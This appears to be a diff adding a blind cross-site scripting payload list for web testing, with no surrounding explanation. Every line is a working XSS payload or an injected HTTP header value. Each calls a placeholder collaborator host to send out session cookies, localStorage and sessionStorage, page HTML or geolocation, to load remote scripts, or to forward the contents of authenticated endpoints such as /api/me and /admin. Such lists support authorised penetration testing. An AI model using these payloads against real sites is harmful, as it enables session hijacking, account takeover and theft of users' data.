@@ -1,0 +1,41 @@
+<script src=//COLLABORATOR_URL/xss.js></script>
+<script>fetch('//COLLABORATOR_URL/?c='+document.cookie)</script>
+<script>new Image().src='//COLLABORATOR_URL/?c='+document.cookie</script>
+<img src=x onerror="fetch('//COLLABORATOR_URL/?c='+document.cookie)">
+<img src=x onerror="new Image().src='//COLLABORATOR_URL/?c='+document.cookie">
+<svg onload="new Image().src='//COLLABORATOR_URL/?c='+document.cookie">
+<script>var x=new XMLHttpRequest();x.open('GET','//COLLABORATOR_URL/?c='+document.cookie);x.send();</script>
+<script>navigator.sendBeacon('//COLLABORATOR_URL/',document.cookie)</script>
+<script>fetch('//COLLABORATOR_URL/',{method:'POST',body:document.cookie})</script>
+<body onload="new Image().src='//COLLABORATOR_URL/?c='+document.cookie">
+<iframe onload="new Image().src='//COLLABORATOR_URL/?c='+document.cookie"></iframe>
+<input autofocus onfocus="new Image().src='//COLLABORATOR_URL/?c='+document.cookie">
+<details open ontoggle="new Image().src='//COLLABORATOR_URL/?c='+document.cookie">
+<script>fetch('//COLLABORATOR_URL/?url='+location.href+'&dom='+btoa(document.body.innerHTML))</script>
+<script>fetch('//COLLABORATOR_URL/?title='+document.title+'&cookie='+document.cookie)</script>
+<script>var x=document.cookie;var y=btoa(x);new Image().src='//COLLABORATOR_URL/?d='+y;</script>
+<script>var x=JSON.stringify(Object.keys(localStorage));new Image().src='//COLLABORATOR_URL/?ls='+encodeURIComponent(x);</script>
+<script>var x={};for(var k in localStorage){x[k]=localStorage[k]};new Image().src='//COLLABORATOR_URL/?d='+btoa(JSON.stringify(x));</script>
+<script>var x={};for(var k in sessionStorage){x[k]=sessionStorage[k]};new Image().src='//COLLABORATOR_URL/?d='+btoa(JSON.stringify(x));</script>
+<script>fetch('/api/me',{credentials:'include'}).then(r=>r.text()).then(d=>new Image().src='//COLLABORATOR_URL/?api='+btoa(d))</script>
+<script>fetch('/api/users',{credentials:'include'}).then(r=>r.text()).then(d=>new Image().src='//COLLABORATOR_URL/?api='+btoa(d))</script>
+<script>fetch('/admin',{credentials:'include'}).then(r=>r.text()).then(d=>new Image().src='//COLLABORATOR_URL/?admin='+btoa(d))</script>
+<script>fetch('/api/config',{credentials:'include'}).then(r=>r.text()).then(d=>new Image().src='//COLLABORATOR_URL/?cfg='+btoa(d))</script>
+<script src="https://COLLABORATOR_URL/payload.js"></script>
+<link rel=import href="//COLLABORATOR_URL/evil.html">
+<script>document.write('<script src=//COLLABORATOR_URL/xss.js><\/script>')</script>
+<script>document.body.appendChild(Object.assign(document.createElement('script'),{src:'//COLLABORATOR_URL/xss.js'}))</script>
+<img src="https://COLLABORATOR_URL/blind.gif">
+<script>new Image().src='https://COLLABORATOR_URL/beacon'</script>
+<script>fetch('https://COLLABORATOR_URL/alive')</script>
+<script>navigator.sendBeacon('https://COLLABORATOR_URL/beacon','alive')</script>
+User-Agent: <script src=//COLLABORATOR_URL/xss.js></script>
+Referer: <script src=//COLLABORATOR_URL/xss.js></script>
+X-Forwarded-For: <script src=//COLLABORATOR_URL/xss.js></script>
+X-Custom-Header: <script src=//COLLABORATOR_URL/xss.js></script>
+Cookie: session=<script src=//COLLABORATOR_URL/xss.js></script>
+<script>fetch('//COLLABORATOR_URL/?ua='+encodeURIComponent(navigator.userAgent))</script>
+<script>fetch('//COLLABORATOR_URL/?lang='+navigator.language+'&tz='+Intl.DateTimeFormat().resolvedOptions().timeZone)</script>
+<script>fetch('//COLLABORATOR_URL/?wh='+window.screen.height+'&ww='+window.screen.width)</script>
+<script>navigator.geolocation&&navigator.geolocation.getCurrentPosition(function(p){fetch('//COLLABORATOR_URL/?lat='+p.coords.latitude+'&lng='+p.coords.longitude)})</script>
+<script>new Image().src='//COLLABORATOR_URL/log?page='+encodeURIComponent(location.href)</script>
